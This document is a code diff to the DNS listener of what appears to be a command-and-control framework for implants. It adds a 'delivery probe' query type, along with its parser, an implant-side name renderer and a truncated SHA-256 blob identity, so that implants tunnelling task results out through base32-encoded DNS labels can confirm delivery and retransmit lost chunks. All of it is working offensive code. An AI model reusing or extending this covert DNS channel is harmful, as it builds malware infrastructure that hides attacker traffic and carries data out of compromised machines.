@@ -21,6 +21,13 @@ namespace Rod.Transport.Listeners.Dns;
 //   result chunk (report a task's outcome, short outputs only):
 //     r.<b32(task id)>.<outcome s|f>.<seq>.<terminal t|m>.<b32(chunk)>.<b32(implant id)>.<zone>
 //
+//   delivery probe (did my result or channel output for this task land?):
+//     n.<b32(task id)>.<b32(sha128 of the plaintext)>.<b32(implant id)>.<zone>
+//   answered TXT y/n -- the retransmission half: a lost chunk drops the
+//   reassembly server-side, so the sender keeps the frame pending until
+//   the probe confirms its blob landed (first-wins makes the re-send
+//   idempotent).
+//
 // A poll is answered with zero or one TXT record whose strings concatenate to
 // the base32 of a signed rod.v1 TaskRequest; a result is answered with an
 // empty NOERROR answer. The chunk sequence is 0-origin decimal; the terminal
@@ -81,6 +88,13 @@ internal static class DnsCheckInNames
 
     /// <summary>One probe of an enrollment answer: a token, a chunk index.</summary>
     internal sealed record EnrollAnswerProbe(byte[] Token, int Sequence);
+
+    /// <summary>
+    /// One delivery probe: the task the sender reported to, and the first 16
+    /// bytes of SHA-256 over the report's plaintext -- the identity of the
+    /// exact blob whose landing the sender asks about.
+    /// </summary>
+    internal sealed record DeliveryProbe(ImplantId Implant, TaskId Task, byte[] Sha);
 
     /// <summary>
     /// Parses a query name against <paramref name="zone"/>. Returns the poll
@@ -283,6 +297,42 @@ internal static class DnsCheckInNames
             + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
             + "." + zone;
 
+    /// <summary>
+    /// Parses a delivery probe against <paramref name="zone"/>:
+    /// n.&lt;b32(task id)&gt;.&lt;b32(sha128)&gt;.&lt;b32(implant id)&gt;.
+    /// </summary>
+    public static DeliveryProbe? TryParseDelivery(string name, string zone)
+    {
+        if (!TryStripZone(name, zone, out var labels))
+            return null;
+        if (labels.Length != 4 || labels[0] != "n")
+            return null;
+        if (!TryDecodeId(labels[3], out var implant))
+            return null;
+        if (!TryDecode(labels[1], out var taskBytes)
+            || !TaskId.TryParse(System.Text.Encoding.UTF8.GetString(taskBytes), out var task))
+            return null;
+        if (!TryDecode(labels[2], out var sha) || sha.Length == 0 || sha.Length > 32)
+            return null;
+        return new DeliveryProbe(implant, task, sha);
+    }
+
+    /// <summary>
+    /// Renders a delivery probe name (the implant-side twin of the parser).
+    /// </summary>
+    public static string ProbeName(ImplantId implant, TaskId task, byte[] sha, string zone)
+        => "n." + Encode(task.ToString())
+            + "." + Encode(sha)
+            + "." + Encode(implant.ToString())
+            + "." + zone;
+
+    /// <summary>
+    /// The delivery probe's blob identity: the first 16 SHA-256 bytes over
+    /// the report's plaintext, the value both sender and server can compute.
+    /// </summary>
+    public static byte[] DeliverySha(byte[] plaintext)
+        => System.Security.Cryptography.SHA256.HashData(plaintext)[..16];
+
     /// <summary>The zone label suffix a name must end with, case-insensitive.</summary>
     private static bool TryStripZone(string name, string zone, out string[] labels)
     {
@@ -293,7 +343,7 @@ internal static class DnsCheckInNames
         if (head.Length == 0)
             return false;
         labels = head.Split('.');
-        return labels.Length > 0 && labels[0] is "p" or "k" or "r" or "c" or "e" or "a";
+        return labels.Length > 0 && labels[0] is "p" or "k" or "r" or "c" or "e" or "a" or "n";
     }
 
     private static bool TryDecodeId(string label, out ImplantId implant)
